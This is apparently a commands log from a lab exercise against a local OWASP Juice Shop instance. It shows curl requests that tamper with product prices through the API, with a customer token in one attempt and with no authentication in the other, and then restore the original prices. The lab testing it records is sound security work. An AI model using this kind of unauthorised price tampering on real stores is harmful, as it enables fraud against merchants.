# Commands Log — OWASP A08: Software and Data Integrity Failures (Juice Shop)

## Setup
mkdir -p raw-output screenshots
touch README.md commands.md findings.md methodology.md remediation.md

## Baseline: capture original product state
curl -s http://localhost:3000/api/Products/1 -o raw-output/product_1_baseline.json
curl -s http://localhost:3000/api/Products/2 -o raw-output/product_2_baseline.json
cat raw-output/product_1_baseline.json | python3 -m json.tool
cat raw-output/product_2_baseline.json | python3 -m json.tool

## Attempt 1: Tamper price using a valid but non-admin (customer) token
curl -s -X PUT http://localhost:3000/api/Products/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"price":0.01}' \
  -w "\nHTTP_STATUS:%{http_code}\n" \
  -o raw-output/product_1_tamper_customer_token.json
cat raw-output/product_1_tamper_customer_token.json

## Confirm tampering is live and public (no auth needed to view)
curl -s "http://localhost:3000/rest/products/search?q=apple" \
  -o raw-output/search_apple_tampered.json
cat raw-output/search_apple_tampered.json | python3 -m json.tool

## Attempt 2: Tamper price with ZERO authentication (no token at all)
curl -s -X PUT http://localhost:3000/api/Products/2 \
  -H "Content-Type: application/json" \
  -d '{"price":0.01}' \
  -w "\nHTTP_STATUS:%{http_code}\n" \
  -o raw-output/product_2_tamper_no_auth.json
cat raw-output/product_2_tamper_no_auth.json

## Confirm second tamper also live publicly
curl -s "http://localhost:3000/rest/products/search?q=orange" \
  -o raw-output/search_orange_tampered.json
cat raw-output/search_orange_tampered.json | python3 -m json.tool

## Cleanup: restore original prices
curl -s -X PUT http://localhost:3000/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"price":1.99}' \
  -w "\nHTTP_STATUS:%{http_code}\n"

curl -s -X PUT http://localhost:3000/api/Products/2 \
  -H "Content-Type: application/json" \
  -d '{"price":2.99}' \
  -w "\nHTTP_STATUS:%{http_code}\n"
